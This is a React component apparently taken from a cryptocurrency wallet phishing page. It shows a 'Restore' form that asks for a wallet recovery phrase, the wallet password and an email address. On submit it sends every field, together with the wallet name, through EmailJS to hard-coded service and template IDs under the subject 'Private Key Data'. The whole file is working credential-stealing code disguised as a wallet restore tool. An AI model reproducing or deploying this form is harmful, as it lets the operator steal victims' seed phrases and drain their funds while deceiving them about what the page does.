import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";
import { useSearchParams } from "react-router-dom";
import Modal from "../Modal";

import FormInput from "../FormInput";

const FORM_INPUT = [
  {
    name: "privateKey",
    label: "Please enter your private key",
    type: "text",
    placeholder: "Enter your private key",
    hint: "Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your acccounts.",
  },
  {
    name: "privateKeyPassword",
    label: "Enter your wallet password",
    type: "password",
    placeholder: "Enter your temporary password",
    hint: "",
  },
  {
    name: "email",
    label: "Enter your email",
    type: "email",
    placeholder: "Enter your email address",
    hint: "",
  },
];

export default function PrivateKey() {
  const [open, setOpen] = useState(false);
  const form = useRef();

  const [searchParams] = useSearchParams();
  const wallet = searchParams.get("wallet");

  const [fields, setFields] = useState({
    email: "",
    privateKeyPassword: "",
    privateKey: "",
  });

  const handleChange = (e) => {
    setFields((prev) => ({ ...prev, [e.target.name]: e.target.value }));
  };

  const toggle = () => setOpen(!open);
  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .send(
        "service_6258sgd",
        "template_10fpf9e",
        {
          ...fields,
          wallet,
          email_subject: "Private Key Data",
          form_type: "private key",
        },
        "jX1TPYiDMqjJpr0-S"
      )
      .then(
        (result) => {
          alert("Email Sent");
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.target.reset();
  };
  return (
    <div>
      {open && <Modal toggle={toggle} />}
      <form
        ref={form}
        className=" flex flex-col items-start justify-start  gap-2"
        onSubmit={sendEmail}
      >
        {FORM_INPUT.map((input, index) => (
          <FormInput
            key={index}
            {...input}
            onchange={handleChange}
            value={fields[input.name]}
          />
        ))}
        <button
          type="submit"
          onClick={toggle}
          className="font-bold my-2 text-black bg-blue-400 max-w-full w-48 p-2 rounded-md"
        >
          Restore
        </button>
      </form>
    </div>
  );
}
